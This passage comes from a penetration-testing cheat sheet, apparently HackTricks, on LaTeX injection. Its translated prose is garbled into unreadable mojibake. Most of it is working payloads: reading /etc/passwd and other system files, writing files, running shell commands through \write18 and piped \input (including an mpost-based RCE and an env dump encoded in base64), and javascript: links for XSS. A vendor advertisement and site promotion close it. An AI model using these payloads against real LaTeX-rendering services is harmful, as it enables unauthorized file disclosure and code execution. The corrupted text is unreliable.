* **`--shell-escape`**: `\write18{command}` рдирд┐рд░реНрдорд┐рдд рдХрд░реЗрдВред рдХрдорд╛рдВрдб рдХреЛрдИ рднреА рд╢реИрд▓ рдХрдорд╛рдВрдб рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдирд┐рд░реНрдорд╛рдг рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рд╕рд╛рдорд╛рдиреНрдпрдд: рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреА рдЬрд╛рддреА рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП RCE рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП `--shell-restricted` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ <a href="#read-file" id="read-file"></a>

рдЖрдкрдХреЛ рд╡реНрд░реИрдкрд░реНрд╕ рдХреЗ рд╕рд╛рде рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ \[ рдпрд╛ $ред
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### рдПрдХрд▓ рд░реЗрдЦрд╛рдВрдХрд┐рдд рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### рдПрдХрд╛рдзрд┐рдХ рдкрдВрдХреНрддрд┐рдпреЛрдВ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦреЗрдВ <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди <a href="#command-execution" id="command-execution"></a>

рдХрдорд╛рдВрдб рдХрд╛ рдЗрдирдкреБрдЯ stdin рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреЗрдореНрдк рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ рд▓реЗрдЯреЗрдХ рддреНрд░реБрдЯрд┐ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдмреЗрд╕64 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### рдХреНрд░реЙрд╕ рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## рдЧреЛрд╕реНрдЯрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди

TODO: [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) рд╕реЗ рдЕрдзрд┐рдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рддрдХрдиреАрдХреЛрдВ рдХреЗ рд╕рд╛рд░рд╛рдВрд╢ рдмрдирд╛рдПрдВред

## рд╕рдВрджрд░реНрдн

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝реА рдЦреЛрдЬреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдорд╛рдпрдиреЗ рд░рдЦрддреА рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред рдЗрдВрдЯреНрд░реВрдбрд░ рдЖрдкрдХреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрд╛рд░рд╛рддреНрдордХ рдЦрддрд░рд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдПрдкреАрдЖрдИ рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рдЬреИрд╕реЗ рдЖрдкрдХреЗ рдкреВрд░реЗ рдЯреЗрдХ рд╕реНрдЯреИрдХ рдореЗрдВ рдореБрджреНрджреЗ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдЖрдЬ рд╣реА рдореБрдлреНрдд рдореЗрдВ рдЗрд╕реЗ рдЯреНрд░рд╛рдИ рдХрд░реЗрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
